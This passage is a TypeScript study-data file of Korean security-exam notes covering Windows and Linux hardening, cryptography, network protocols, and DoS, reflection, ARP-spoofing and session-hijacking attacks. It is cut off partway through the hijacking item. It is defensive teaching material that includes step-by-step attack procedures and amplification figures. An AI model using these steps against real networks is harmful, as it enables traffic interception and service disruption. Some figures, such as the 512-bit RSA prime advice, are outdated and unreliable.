// 단톡방 자료에서 추출한 추가 학습 내용
// 출처: 화이팅님, 코코비비님, 쑴님, 봉님, 바나나님 자료

import { StudyItem } from './studyData';

export const additionalStudyItems: StudyItem[] = [
  // ==================== 윈도우 보안 ====================
  {
    id: 'windows-auth-detail',
    category: 'windows',
    subcategory: '인증',
    title: '윈도우 인증 구성요소 상세',
    content: `
**인증 구성요소:**

| 구성요소 | 설명 |
|----------|------|
| **LSA** | 모든 계정의 로그인 검증, 시스템 자원 접근 권한 검사, 로컬/원격 로그인 포함 |
| **SAM** | 사용자/그룹 계정의 패스워드 관리, LSA를 통한 인증 제공 |
| **SRM** | 인증된 사용자에게 SID 부여, SID 기반 파일/디렉터리 접근 허용 결정, 감사 메시지 생성 |

**인증 방법:**
- **로컬 인증**: LSA → NTLM 모듈 → SAM 조회 → 인증 처리
- **도메인 인증**: LSA → Kerberos → 도메인 컨트롤러 → 액티브 디렉터리

**SID 구조:**
\`\`\`
S-1-5-21-[시스템]-[도메인컨트롤러]-[시스템고유]-[사용자식별자]
- 500: Administrator
- 501: Guest
- 1000+: 일반 사용자
\`\`\`

**SID 확인:** cmd → wmic → useraccount list brief

**인증 암호 알고리즘:**

| 알고리즘 | 설명 |
|----------|------|
| LM 해시 | Vista 이전, 구조적 취약 |
| NTLM 해시 | LM + MD4 |
| NTLMv2 해시 | Vista 이후 기본, 현재까지 복잡도 충분 |
    `,
    keyPoints: ['LSA=로그인 검증', 'SAM=패스워드 관리', 'SRM=SID 기반 접근통제', 'NTLMv2가 가장 안전'],
    isWeakness: true,
  },

  {
    id: 'windows-registry',
    category: 'windows',
    subcategory: '시스템',
    title: '윈도우 레지스트리 구조',
    content: `
**레지스트리 구조:**

| 루트키 | 설명 | 하이브 파일 |
|--------|------|-------------|
| **HKCR** | 파일 확장자와 연결 프로그램 정보 | - |
| **HKCU** | 현재 로그인 사용자 환경설정 | NTUSER.dat |
| **HKLM** | 시스템 전체 하드웨어/소프트웨어 설정 | SAM, SECURITY, SOFTWARE, SYSTEM |
| **HKU** | 모든 사용자별 환경설정 | - |
| **HKCC** | 현재 하드웨어 프로필 | - |

**주요 하이브 파일:**
- **SAM**: 계정 정보 및 접속 기록
- **SECURITY**: 시스템 보안 정책 및 권한 정보
- **SOFTWARE**: 설치된 모든 어플리케이션 정보
- **SYSTEM**: 시스템 관련 설정 정보
- **NTUSER.dat**: 사용자별 환경설정/프로파일 정보

**포렌식 분석 시 중요:**
- 오프라인 상태의 비활성 시스템에서 하이브 파일 직접 분석
- 사고 분석 시 공격자의 흔적 확인 가능
    `,
    keyPoints: ['HKLM=시스템 전체 설정', 'HKCU=현재 사용자', 'SAM=계정정보', 'NTUSER.dat=사용자 프로필'],
    isWeakness: false,
  },

  {
    id: 'windows-accounts',
    category: 'windows',
    subcategory: '계정',
    title: '윈도우 기본 계정/그룹',
    content: `
**기본 사용자 계정:**

| 계정 | 설명 |
|------|------|
| Administrator | 관리자 권한의 계정 |
| SYSTEM | 로컬에서 관리자보다 상위 권한을 가진 계정 |
| Guest | 매우 제한적인 권한을 가진 계정 |

**기본 그룹:**

| 그룹 | 권한 |
|------|------|
| **Administrators** | 도메인/로컬 컴퓨터에 대한 모든 권한 |
| **Account Operators** | 사용자나 그룹 계정 관리 |
| **Backup Operators** | 모든 시스템 파일과 디렉터리에 접근 (백업 목적) |
| **Guests** | 도메인 사용 권한 제한 |
| **Power Users** | 디렉터리/네트워크 공유, 시계 설정 등 |
| **Replicator** | 도메인 내 파일 복제 |
| **Server Operators** | 도메인 서버 관리 |
| **Users** | 도메인/로컬 컴퓨터 일반 사용 |

**보안 설정:**
- Administrator 계정명 변경 권장
- Guest 계정 사용 안함 설정
- 불필요한 계정 삭제/잠금
    `,
    keyPoints: ['SYSTEM=최상위 권한', 'Administrators=관리자 그룹', 'Guest 비활성화 권장', 'Power Users=제한적 관리 권한'],
    isWeakness: false,
  },

  {
    id: 'windows-pe-format',
    category: 'windows',
    subcategory: '파일형식',
    title: 'PE (Portable Executable) 파일 구조',
    content: `
**PE 파일 구조:**

Windows 운영체제에서 사용하는 실행파일 포맷

**구성 요소:**

| 영역 | 설명 |
|------|------|
| **PE Header** | 모든 PE 파일이 공통으로 가지는 헤더 |
| **Section Header** | 각 섹션의 메모리 로딩 정보, 속성 설정 |
| **Section** | 실제 코드, 데이터, 리소스 배치 영역 |

**주요 섹션:**

| 섹션 | 설명 |
|------|------|
| **.text** | 프로그램 실행 코드 |
| **.data** | 읽기/쓰기 가능한 데이터 |
| **.rdata** | 읽기 전용 데이터 |
| **.bss** | 초기화되지 않은 전역변수 |
| **.idata** | Import DLL/API 정보 |
| **.edata** | Export DLL/API 정보 |
| **.rsrc** | 리소스 관련 데이터 |
| **.reloc** | 재배치 정보 |

**악성코드 분석 시:**
- Import Table: 사용하는 API 함수 확인
- Section 이름/속성 이상 여부 검사
- 패킹 여부 확인
    `,
    keyPoints: ['.text=실행코드', '.data=데이터', '.idata=Import 정보', '.edata=Export 정보'],
    isWeakness: false,
  },

  // ==================== 리눅스 보안 ====================
  {
    id: 'linux-log-detail',
    category: 'linux',
    subcategory: '로그',
    title: '리눅스 주요 로그 파일 상세',
    content: `
**주요 로그 파일:**

| 로그 파일 | 경로 | 용도 | 확인 명령 |
|-----------|------|------|-----------|
| **utmp** | /var/run/utmp | 현재 로그인 사용자 | w, who, finger |
| **wtmp** | /var/log/wtmp | 로그인/로그아웃, 부팅 정보 | last |
| **btmp** | /var/log/btmp | 실패한 로그인 시도 | lastb |
| **lastlog** | /var/log/lastlog | 최근 로그인 기록 | lastlog |
| **pacct** | /var/account/pacct | 실행한 명령어 기록 | lastcomm |
| **secure** | /var/log/secure | 인증 관련 로그 | cat, vi |
| **messages** | /var/log/messages | 시스템 전체 메시지 | cat, tail |

**xferlog (FTP 로그) 필드:**
\`\`\`
전송날짜/시간 | 전송소요시간 | 원격호스트 | 파일크기 | 파일명
전송유형(a/b) | 액션플래그 | 전송방향(i/o/d) | 접근방식(r/a/g)
사용자명 | 서비스명 | 인증방법 | 완료상태(c/i)
\`\`\`

**로그 실시간 모니터링:**
\`\`\`bash
tail -f /var/log/messages
tail -f /var/log/secure
\`\`\`
    `,
    keyPoints: ['utmp=현재 로그인', 'wtmp=로그인 기록', 'btmp=실패한 로그인', 'secure=인증 로그'],
    isWeakness: true,
  },

  {
    id: 'special-bits-detail',
    category: 'linux',
    subcategory: '권한',
    title: '특수 비트 (SetUID/SetGID/Sticky) 상세',
    content: `
**특수 비트 개요:**

| 비트 | 8진수 | 기호 | 파일에서 | 디렉터리에서 |
|------|-------|------|----------|--------------|
| **SetUID** | 4000 | s (owner x) | 소유자 권한으로 실행 | - |
| **SetGID** | 2000 | s (group x) | 그룹 권한으로 실행 | 새 파일이 디렉터리 그룹 상속 |
| **Sticky** | 1000 | t (other x) | - | 소유자만 파일 삭제 가능 |

**SetUID 예시:**
\`\`\`
-rwsr-xr-x 1 root root 47888 /usr/bin/passwd
→ chmod 4755 /usr/bin/passwd
\`\`\`

**SetGID 예시:**
\`\`\`
-rwxr-sr-x 1 root root 14760 /usr/bin/wall
→ chmod 2755 /usr/bin/wall
\`\`\`

**Sticky-bit 예시:**
\`\`\`
drwxrwxrwt 1 root root 47888 /tmp
→ chmod 1777 /tmp
# 파일 생성은 누구나, 삭제는 소유자/root만
\`\`\`

**보안 점검:**
\`\`\`bash
# SetUID 파일 찾기
find / -perm -4000 -type f 2>/dev/null

# SetGID 파일 찾기
find / -perm -2000 -type f 2>/dev/null
\`\`\`
    `,
    keyPoints: ['SetUID=4000, 소유자 권한 실행', 'SetGID=2000', 'Sticky=1000, 삭제 제한', '/tmp에 Sticky 설정'],
    isWeakness: true,
  },

  {
    id: 'linux-passwd-shadow',
    category: 'linux',
    subcategory: '계정',
    title: '/etc/passwd와 /etc/shadow 구조',
    content: `
**/etc/passwd 파일 구조:**
\`\`\`
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[1계정명]:[2패스워드]:[3UID]:[4GID]:[5설명]:[6홈디렉터리]:[7로그인셸]
\`\`\`
- x는 shadow 패스워드 정책 사용 의미

**/etc/shadow 파일 구조:**
\`\`\`
root:$1$erj$ajfpwpaewjf/:13115:0:99999:7:1::
[계정명]:[암호화 비밀번호]:[마지막변경일]:[최소사용기간]:[최대사용기간]:
[만료전경고기간]:[비활성화기간]:[만료일]
\`\`\`

**해시 알고리즘 식별:**

| ID | 알고리즘 |
|----|----------|
| $1 | MD5 |
| $2 | Blowfish |
| $5 | SHA-256 |
| $6 | SHA-512 |

**패스워드 정책 명령어:**
\`\`\`bash
pwconv      # shadow 패스워드 정책 활성화
pwunconv    # 일반 패스워드 정책으로 복귀
passwd -l   # 패스워드 잠금
passwd -u   # 패스워드 잠금 해제
\`\`\`

**Salt 값의 역할:**
- 동일 패스워드도 다른 해시값 생성
- 레인보우 테이블 공격 방어
    `,
    keyPoints: ['$6=SHA-512', 'shadow 파일 권한 400', 'pwconv로 shadow 활성화', 'Salt로 레인보우 테이블 방어'],
    isWeakness: true,
  },

  {
    id: 'linux-pam',
    category: 'linux',
    subcategory: '인증',
    title: 'PAM (Pluggable Authentication Modules)',
    content: `
**PAM 설정 파일 구조:**
\`\`\`
type control module-path module-arguments
\`\`\`

**Type (모듈 종류):**

| 타입 | 설명 |
|------|------|
| **auth** | 패스워드 확인, 실질적 인증 |
| **account** | 계정 유효성 검증, 사용 권한 확인 |
| **password** | 패스워드 설정/변경 조건 (복잡도, 최소길이) |
| **session** | 세션 관리, 인증 전후 작업 |

**Control (제어 플래그):**

| 제어 | 설명 |
|------|------|
| **requisite** | 실패 시 즉시 거부 |
| **required** | 실패해도 모듈 완료 후 거부 |
| **sufficient** | 성공 시 즉시 승인 (이전 required 성공 시) |
| **optional** | 성공/실패 무관 |

**주요 설정 예시:**
\`\`\`
# 계정 잠금 설정 (/etc/pam.d/system-auth)
auth required pam_tally.so deny=5 unlock_time=120 no_magic_root
account required pam_tally.so no_magic_root reset

# root SSH 제한 (/etc/ssh/sshd_config)
PermitRootLogin no

# su 제한 (/etc/pam.d/su)
auth required pam_wheel.so use_uid
\`\`\`
    `,
    keyPoints: ['auth=인증', 'account=계정검증', 'requisite=즉시거부', 'required=완료후거부'],
    isWeakness: true,
  },

  {
    id: 'linux-crontab',
    category: 'linux',
    subcategory: '스케줄러',
    title: 'crontab 설정',
    content: `
**crontab 필드 구조:**
\`\`\`
분 시 일 월 요일 명령어
0-59 0-23 1-31 1-12 0-6(일요일=0)
\`\`\`

**예시:**

| 설정 | 의미 |
|------|------|
| \`0 1 * * * /backup.sh\` | 매일 새벽 1시 |
| \`*/5 * * * * /check.sh\` | 5분마다 |
| \`0 9 * * 1-5 /work.sh\` | 월~금 오전 9시 |
| \`0 0 1 * * /monthly.sh\` | 매월 1일 자정 |

**crontab 명령어:**
\`\`\`bash
crontab -l        # 등록된 작업 출력
crontab -e        # 작업 편집
crontab -r        # 모든 작업 삭제
crontab -u user -l  # 다른 계정 작업 확인
\`\`\`

**접근제어:**
- /etc/cron.allow: 등록된 사용자만 허용 (화이트리스트)
- /etc/cron.deny: 등록된 사용자 거부 (블랙리스트)
- 둘 다 있으면 allow 우선
- 둘 다 없으면 root만 허용

**logrotate 주요 옵션:**

| 옵션 | 설명 |
|------|------|
| daily/weekly/monthly | 로그 순환 주기 |
| rotate n | 보관할 로그 개수 |
| compress | 압축 보관 |
| create | 순환 후 새 파일 생성 |
| size 100M | 크기 도달 시 순환 |
    `,
    keyPoints: ['분 시 일 월 요일 순서', 'cron.allow 우선', '*/5 = 5분마다', 'logrotate로 로그 관리'],
    isWeakness: false,
  },

  {
    id: 'linux-tcp-wrapper',
    category: 'linux',
    subcategory: '접근제어',
    title: 'TCP Wrapper / xinetd',
    content: `
**TCP Wrapper 설정:**
- /etc/hosts.allow: 접근 허용 (화이트리스트)
- /etc/hosts.deny: 접근 거부 (블랙리스트)
- 둘 다 있으면 allow 우선
- 둘 다 없으면 모두 허용

**설정 예시:**
\`\`\`
# /etc/hosts.allow
in.telnetd : .aaa.com EXCEPT www.aaa.com
# aaa.com 도메인 중 www.aaa.com 제외하고 허용

# /etc/hosts.deny
ALL : ALL
# 모든 서비스, 모든 호스트 차단
\`\`\`

**xinetd 설정 (/etc/xinetd.d/*):**
\`\`\`
service telnet
{
    disable = no          # 서비스 실행
    socket_type = stream  # TCP: stream, UDP: dgram
    wait = no             # 즉시 처리
    user = root           # 실행 권한
    server = /usr/sbin/in.telnetd
    only_from = 192.168.1.0/24  # 접근 허용 IP
    no_access = 192.168.1.100   # 접근 차단 IP
    access_time = 09:00-18:00   # 허용 시간
    cps = 50 10           # 초당 최대 연결 50, 대기 10초
}
\`\`\`

**inetd vs xinetd:**
- inetd: 구버전, 단순 설정
- xinetd: 향상된 보안 기능, 접근제어 내장
    `,
    keyPoints: ['hosts.allow 우선', 'only_from=허용 IP', 'no_access=차단 IP', 'xinetd가 inetd 대체'],
    isWeakness: true,
  },

  // ==================== 암호학 ====================
  {
    id: 'block-cipher-modes',
    category: 'crypto',
    subcategory: '대칭키',
    title: '블록 암호 운용 모드',
    content: `
**블록 암호 운용 모드 비교:**

| 모드 | IV | 특징 | 장단점 |
|------|-----|------|--------|
| **ECB** | X | 각 블록 독립 암호화 | 패턴 노출 (펭귄 문제), 사용 금지 |
| **CBC** | O | 이전 암호문과 XOR | 가장 많이 사용, 순차 처리 |
| **CFB** | O | 스트림 암호처럼 | 실시간 통신용 |
| **OFB** | O | 키 스트림 생성 | 에러 전파 없음 |
| **CTR** | O (Nonce) | 카운터 암호화 | 병렬 처리 가능, 빠름 |
| **GCM** | O | CTR + 인증 태그 | 기밀성 + 무결성 제공 |

**ECB (Electronic Code Book):**
- 동일 평문 → 동일 암호문 (패턴 노출)
- 사용 금지 권고

**CBC (Cipher Block Chaining):**
- 이전 암호문 블록과 XOR 후 암호화
- IV 필요, 가장 널리 사용
- 순차 처리 필요

**CTR (Counter):**
- 카운터 값을 암호화하여 평문과 XOR
- 병렬 처리 가능, 빠름
- 랜덤 액세스 가능

**GCM (Galois/Counter Mode):**
- CTR + GMAC
- 기밀성 + 무결성 + 인증
- TLS 1.3에서 권장
    `,
    keyPoints: ['ECB=사용금지', 'CBC=가장 많이 사용', 'CTR=병렬처리', 'GCM=기밀성+무결성'],
    isWeakness: true,
  },

  {
    id: 'hash-properties',
    category: 'crypto',
    subcategory: '해시',
    title: '해시 함수 특성',
    content: `
**해시 함수 보안 특성:**

| 특성 | 설명 | 공격 |
|------|------|------|
| **역상 저항성** | 해시값 → 입력값 찾기 어려움 | 역상 공격 |
| **제2역상 저항성** | 같은 해시값의 다른 입력 찾기 어려움 | 제2역상 공격 |
| **충돌 저항성** | 같은 해시값의 두 입력 쌍 찾기 어려움 | 충돌 공격 |

**쉬운 설명:**
\`\`\`
해시값 = 음료의 맛
입력값 = 음료 레시피

역상 저항성: 맛만 보고 레시피 알기 어려움
제2역상 저항성: 레시피A와 같은 맛의 레시피B 찾기 어려움
충돌 저항성: 같은 맛의 아무 레시피 두 개 찾기 어려움
\`\`\`

**주요 해시 알고리즘:**

| 알고리즘 | 출력 크기 | 상태 |
|----------|-----------|------|
| MD5 | 128비트 | 취약, 사용 금지 |
| SHA-1 | 160비트 | 취약, 권장하지 않음 |
| SHA-256 | 256비트 | 안전, 권장 |
| SHA-512 | 512비트 | 안전, 권장 |
| SHA-3 | 가변 | 최신, 안전 |

**용도:**
- 무결성 검증
- 패스워드 저장
- 디지털 서명
- 메시지 인증 코드 (HMAC)
    `,
    keyPoints: ['역상저항성=원본 복원 불가', '충돌저항성=같은 해시 쌍 불가', 'MD5/SHA-1 취약', 'SHA-256 권장'],
    isWeakness: true,
  },

  {
    id: 'asymmetric-crypto',
    category: 'crypto',
    subcategory: '공개키',
    title: '비대칭키 암호화 알고리즘',
    content: `
**비대칭키 알고리즘 분류:**

| 기반 | 알고리즘 | 용도 |
|------|----------|------|
| **소인수 분해** | RSA, Rabin | 암호화, 서명 |
| **이산 로그** | DH, ElGamal, DSA | 키교환, 서명 |
| **타원 곡선** | ECC, ECDH, ECDSA | 경량화, IoT |

**RSA:**
\`\`\`
키 생성:
1. 두 소수 p, q 선택 (512bit 이상 권장)
2. N = p × q
3. φ(N) = (p-1) × (q-1)
4. e 선택: gcd(e, φ(N)) = 1
5. d 계산: e × d ≡ 1 (mod φ(N))
공개키: (e, N) / 개인키: (d, N)
\`\`\`

**Diffie-Hellman:**
- 키 교환 전용 (암호화 X)
- 중간자 공격에 취약 → PKI로 해결
- g^xy mod P 계산

**ECC (타원곡선):**
- 짧은 키 길이로 높은 보안성
- 256비트 ECC ≈ 3072비트 RSA
- 모바일/IoT 환경에 적합

**전자서명 vs 암호화:**
\`\`\`
전자서명: 개인키로 서명 → 공개키로 검증 (인증, 부인방지)
암호화: 공개키로 암호화 → 개인키로 복호화 (기밀성)
\`\`\`
    `,
    keyPoints: ['RSA=소인수분해', 'DH=키교환', 'ECC=경량화', '서명=개인키, 암호화=공개키'],
    isWeakness: true,
  },

  // ==================== 네트워크 보안 ====================
  {
    id: 'lan-switching',
    category: 'network',
    subcategory: '스위칭',
    title: 'LAN 스위칭 기법',
    content: `
**스위칭 방식 비교:**

| 방식 | 처리 방법 | 지연 시간 | 에러 처리 |
|------|-----------|-----------|-----------|
| **Cut-through** | 목적지 MAC만 확인 후 포워딩 | 가장 짧음 | 없음 |
| **Fragment Free** | 64바이트까지 확인 | 중간 | 충돌 감지 |
| **Store and Forward** | 전체 프레임 수신 후 처리 | 가장 김 | CRC 검사 |

**스위치 기본 기능:**

| 기능 | 설명 |
|------|------|
| Learning | 출발지 MAC을 MAC 테이블에 저장 |
| Flooding | MAC 테이블에 없으면 모든 포트로 전송 |
| Forwarding | MAC 테이블 참조하여 해당 포트로 전송 |
| Filtering | 목적지 외 포트에는 전송 안함 |
| Aging | MAC 테이블 정보 유지 시간 |

**보안 고려:**
- Fail Safe: 장애 시 모든 기능 허용
- Fail Secure: 장애 시 모든 기능 차단
- 네트워크 장비는 대부분 Fail Safe (가용성 중시)
    `,
    keyPoints: ['Cut-through=헤더만 확인', 'Fragment Free=64바이트', 'Store and Forward=전체 확인', 'Learning=MAC 학습'],
    isWeakness: true,
  },

  {
    id: 'vlan-config',
    category: 'network',
    subcategory: 'VLAN',
    title: 'VLAN 구성 및 보안',
    content: `
**VLAN 할당 방식:**

| 방식 | 기준 | 특징 |
|------|------|------|
| **포트 기반** | 스위치 포트 | 가장 일반적, 정적 |
| **MAC 기반** | MAC 주소 | 동적 할당, VMPS 필요 |
| **프로토콜 기반** | 프로토콜 | IP/IPX 분리 |
| **서브넷 기반** | IP 서브넷 | 계층적 구조 |

**VLAN 설정 (Cisco):**
\`\`\`
Switch(config)# vlan 10
Switch(config-vlan)# name SALES
Switch(config)# interface fa0/1
Switch(config-if)# switchport mode access
Switch(config-if)# switchport access vlan 10
\`\`\`

**트렁크 설정:**
\`\`\`
Switch(config-if)# switchport mode trunk
Switch(config-if)# switchport trunk allowed vlan 10,20,30
\`\`\`

**VLAN 보안 위협:**

| 공격 | 설명 | 대응 |
|------|------|------|
| VLAN Hopping | 다른 VLAN으로 침투 | 기본 VLAN 변경, DTP 비활성화 |
| Double Tagging | 802.1Q 태그 중첩 | 네이티브 VLAN 사용 안함 |
| Switch Spoofing | 트렁크 협상 악용 | DTP 비활성화 |
    `,
    keyPoints: ['포트 기반=가장 일반적', '기본 VLAN 1 변경 권장', 'DTP 비활성화', 'VLAN Hopping 방지'],
    isWeakness: true,
  },

  {
    id: 'ipsec-detail',
    category: 'network',
    subcategory: 'VPN',
    title: 'IPSec 상세',
    content: `
**IPSec 프로토콜:**

| 프로토콜 | 기능 | 보안 서비스 |
|----------|------|-------------|
| **AH** | 무결성, 인증 | 데이터 무결성, 발신지 인증, 재전송 방지 |
| **ESP** | 기밀성, 무결성, 인증 | 암호화 + AH 기능 |
| **IKE** | 키 교환 | SA 협상, 키 분배 (500/udp) |

**동작 모드:**

| 모드 | IP 헤더 | 보호 범위 | 사용 환경 |
|------|---------|-----------|-----------|
| **전송 모드** | 원본 유지 | IP 페이로드 | Host-to-Host |
| **터널 모드** | 새 헤더 추가 | IP 패킷 전체 | Site-to-Site VPN |

**SA (Security Association):**
- 단방향 연결 (양방향 통신 = 2개 SA)
- SPI (Security Parameter Index)로 식별
- SAD (Security Association Database)에 저장

**SPD (Security Policy Database):**
- 정책: 허용(Bypass), 거부(Discard), 보호(IPSec 적용)
- SAD 참조하여 적용할 SA 결정

**IKE 단계:**
1. IKE Phase 1: 보안 채널 수립 (Main/Aggressive Mode)
2. IKE Phase 2: IPSec SA 협상 (Quick Mode)
    `,
    keyPoints: ['AH=무결성+인증', 'ESP=암호화+무결성+인증', '전송모드=원본헤더', '터널모드=새헤더'],
    isWeakness: true,
  },

  {
    id: 'ssl-tls-detail',
    category: 'network',
    subcategory: 'TLS',
    title: 'SSL/TLS 상세',
    content: `
**TLS 버전별 특징:**

| 버전 | 발표 | 취약점 | 상태 |
|------|------|--------|------|
| SSL 3.0 | 1996 | POODLE, DROWN | 사용 금지 |
| TLS 1.0 | 1999 | BEAST, CRIME | 권장하지 않음 |
| TLS 1.1 | 2006 | 일부 취약점 | 권장하지 않음 |
| TLS 1.2 | 2008 | - | 현재 표준 |
| TLS 1.3 | 2018 | - | 최신, PFS 제공 |

**TLS 프로토콜 구조:**

| 계층 | 프로토콜 | 기능 |
|------|----------|------|
| 상위 | Handshake | 보안 파라미터 협상 |
| 상위 | Change Cipher Spec | 암호 변경 알림 |
| 상위 | Alert | 오류 통보 |
| 상위 | Application Data | 애플리케이션 데이터 |
| 하위 | Record | 암호화, MAC, 압축 |

**Handshake 과정:**
\`\`\`
Client → Server: ClientHello (지원 암호 목록)
Server → Client: ServerHello (선택 암호)
Server → Client: Certificate (서버 인증서)
Server → Client: ServerHelloDone
Client → Server: ClientKeyExchange (사전 마스터 비밀)
Client → Server: ChangeCipherSpec
Client → Server: Finished
Server → Client: ChangeCipherSpec
Server → Client: Finished
\`\`\`

**PFS (Perfect Forward Secrecy):**
- 서버 개인키 노출 시에도 이전 세션 기밀 유지
- DHE, ECDHE 사용
    `,
    keyPoints: ['TLS 1.2/1.3 권장', 'Handshake=키교환', 'Record=암호화', 'PFS=DHE/ECDHE'],
    isWeakness: true,
  },

  {
    id: 'routing-protocols',
    category: 'network',
    subcategory: '라우팅',
    title: '라우팅 프로토콜 비교',
    content: `
**라우팅 프로토콜 분류:**

| 프로토콜 | 유형 | 알고리즘 | 특징 |
|----------|------|----------|------|
| **RIP** | IGP | 거리 벡터 | 최대 15홉, 30초 업데이트 |
| **OSPF** | IGP | 링크 상태 | 변화 시 전파, 영역 구분 |
| **EIGRP** | IGP | 하이브리드 | 시스코 전용, DUAL 알고리즘 |
| **BGP** | EGP | 경로 벡터 | AS 간 라우팅, 인터넷 백본 |

**거리 벡터 vs 링크 상태:**

| 특성 | 거리 벡터 | 링크 상태 |
|------|-----------|-----------|
| 전송 정보 | 전체 라우팅 테이블 | LSA (변경 정보) |
| 업데이트 | 주기적 (30초) | 변화 시 |
| 수렴 속도 | 느림 | 빠름 |
| 리소스 | 적음 | 많음 |
| 루프 | 발생 가능 | 거의 없음 |

**라우터 보안 설정:**
\`\`\`
# 라우팅 인증
router ospf 1
 area 0 authentication message-digest

# 불필요한 서비스 중지
no ip http server
no ip directed-broadcast
no ip source-route

# Ingress/Egress 필터링
ip access-list extended INGRESS
 deny ip 10.0.0.0 0.255.255.255 any
 permit ip any any
\`\`\`
    `,
    keyPoints: ['RIP=거리벡터, 15홉', 'OSPF=링크상태, 빠른수렴', 'BGP=AS간 라우팅', '라우팅 인증 설정 필요'],
    isWeakness: true,
  },

  // ==================== 네트워크 공격 ====================
  {
    id: 'dos-attacks',
    category: 'network',
    subcategory: '공격',
    title: 'DoS 공격 유형',
    content: `
**DoS 공격 분류:**

| 공격 | 방식 | 대응 |
|------|------|------|
| **Ping of Death** | 65,535바이트 초과 ICMP | 패치 적용 |
| **Land Attack** | 출발지=목적지 IP | 패킷 필터링 |
| **Smurf** | IP 위조 + 브로드캐스트 | no ip directed-broadcast |
| **Teardrop** | 단편 오프셋 조작 | 패치 적용 |
| **SYN Flood** | 대량 SYN 패킷 | SYN Cookie |

**Smurf Attack:**
\`\`\`
1. 출발지 IP를 희생자로 위조
2. ICMP Echo Request를 브로드캐스트로 전송
3. 네트워크의 모든 호스트가 희생자에게 Reply
4. 증폭된 트래픽으로 희생자 마비
\`\`\`

**Land Attack:**
\`\`\`
출발지 IP = 목적지 IP = 희생자 IP
→ 무한 루프 발생
\`\`\`

**Teardrop/Bonk/Boink:**

| 공격 | 방식 |
|------|------|
| Teardrop | 단편 오프셋 중첩 |
| Bonk | 모든 순서번호를 1로 |
| Boink | 정상 후 갑자기 비정상 순서번호 |

**대응:**
- 패치 적용
- 방화벽/IDS 설정
- 출발지 IP 필터링
    `,
    keyPoints: ['Smurf=브로드캐스트 증폭', 'Land=출발지=목적지', 'SYN Flood=Half-Open', 'SYN Cookie로 대응'],
    isWeakness: true,
  },

  {
    id: 'ddos-attacks',
    category: 'network',
    subcategory: '공격',
    title: 'DDoS 공격 유형',
    content: `
**DDoS 공격 분류:**

| 유형 | 공격 | 특징 |
|------|------|------|
| **대역폭 소진** | UDP/ICMP Flooding | 네트워크 대역폭 고갈 |
| **자원 소진** | SYN Flooding, ACK Flooding | 연결 자원 고갈 |
| **웹/DB 부하** | HTTP GET Flooding | 애플리케이션 자원 고갈 |

**Slow 계열 공격:**

| 공격 | 방식 | 대응 |
|------|------|------|
| **Slowloris** | 헤더 미완료 | Timeout 설정 |
| **RUDY** | POST 바디 천천히 전송 | Content-Length 제한 |
| **Slow Read** | Window 크기 0으로 설정 | 연결 타임아웃 |

**HTTP GET Flooding 변종:**

| 공격 | 특징 |
|------|------|
| CC Attack | Cache-Control: no-cache |
| Hulk DoS | URL 무작위 변경 |
| Hash DoS | 해시 충돌 유발 |

**DDoS 대응:**
\`\`\`
# SYN Cookie 활성화
sysctl -w net.ipv4.tcp_syncookies=1

# 연결 제한
iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j DROP

# 타임아웃 설정
Timeout 120
RequestReadTimeout header=5 body=10
\`\`\`

**봇넷 우회 기법:**
- Fast Flux: DNS 질의마다 IP 변경
- DGA: 도메인 동적 생성
- Domain Shadowing: 합법 도메인의 서브도메인 악용
    `,
    keyPoints: ['Slowloris=헤더 미완료', 'RUDY=POST 천천히', 'SYN Cookie 활성화', 'connlimit 설정'],
    isWeakness: true,
  },

  {
    id: 'drdos-attacks',
    category: 'network',
    subcategory: '공격',
    title: 'DRDoS (반사 공격)',
    content: `
**DRDoS 개념:**
- 출발지 IP를 희생자로 위조
- 반사 서버로 요청 전송
- 반사 서버의 응답이 희생자에게 집중

**주요 DRDoS 공격:**

| 공격 | 포트 | 증폭률 | 특징 |
|------|------|--------|------|
| **DNS Amplification** | 53/UDP | ~50배 | ANY 쿼리 악용 |
| **NTP Amplification** | 123/UDP | ~550배 | monlist 명령 |
| **SSDP Amplification** | 1900/UDP | ~30배 | M-SEARCH 요청 |
| **Memcached** | 11211/UDP | ~50,000배 | stats 명령 |

**NTP DRDoS:**
\`\`\`
1. 출발지 IP를 희생자로 위조
2. NTP 서버에 monlist 명령 전송
3. 서버는 접속 기록을 희생자에게 응답
4. 증폭된 트래픽으로 희생자 마비
\`\`\`

**대응:**
\`\`\`
# NTP monlist 비활성화
/etc/ntp.conf: disable monlist

# DNS 재귀 질의 제한
/etc/named.conf:
  recursion no;

# SSDP 포트 차단
iptables -A INPUT -p udp --dport 1900 -j DROP

# Ingress 필터링 (ISP)
위조된 출발지 IP 차단
\`\`\`
    `,
    keyPoints: ['NTP=monlist 비활성화', 'DNS=재귀질의 제한', 'Memcached=최대 증폭률', 'Ingress 필터링'],
    isWeakness: true,
  },

  {
    id: 'arp-attacks',
    category: 'network',
    subcategory: '공격',
    title: 'ARP 스푸핑/리다이렉트',
    content: `
**ARP Spoofing:**
\`\`\`
1. 특정 호스트의 MAC을 자신의 MAC으로 위조한 ARP Reply 생성
2. 희생자에게 지속적으로 전송
3. 희생자의 ARP Cache Table 변조
4. IP Forward 활성화 (정상 통신 유지)
5. 희생자 → 특정 호스트 트래픽 스니핑
\`\`\`

**ARP Redirect (게이트웨이 위장):**
\`\`\`
1. 자신이 라우터인 것처럼 ARP Reply 브로드캐스트
2. 네트워크 전체의 ARP Cache 변조
3. 모든 외부 트래픽이 공격자 경유
\`\`\`

**ICMP Redirect:**
\`\`\`
1. ICMP Redirect 메시지로 라우팅 테이블 변조
2. 희생자의 경로 변경
3. 특정 목적지 트래픽 스니핑
\`\`\`

**대응:**
\`\`\`bash
# ARP 정적 설정
arp -s 192.168.1.1 00:11:22:33:44:55

# ICMP Redirect 비활성화
sysctl -w net.ipv4.conf.all.accept_redirects=0
sysctl -w net.ipv4.conf.all.send_redirects=0

# ARP 감시 도구
arpwatch
\`\`\`

**탐지 방법:**
- ARP 테이블 모니터링
- 동일 IP에 여러 MAC 감지
- 비정상 ARP 트래픽 분석
    `,
    keyPoints: ['ARP Spoofing=MAC 위조', 'ARP Redirect=게이트웨이 위장', 'arp -s=정적 설정', 'arpwatch 모니터링'],
    isWeakness: true,
  },

  {
    id: 'tcp-session-hijacking',
    category: 'network',
    subcategory: '공격',
    title: 'TCP 세션 하이재킹',
    content: `
**TCP 세션 하이재킹 과정:**
\`\`\`
1. ARP 스푸핑으로 클라이언트-서버 통신 스니핑
2. Sequence Number 파악
3. 희생자의 IP로 위조된 TCP 패킷 생성
4. 서버에 전송 → ACK Storm 발생
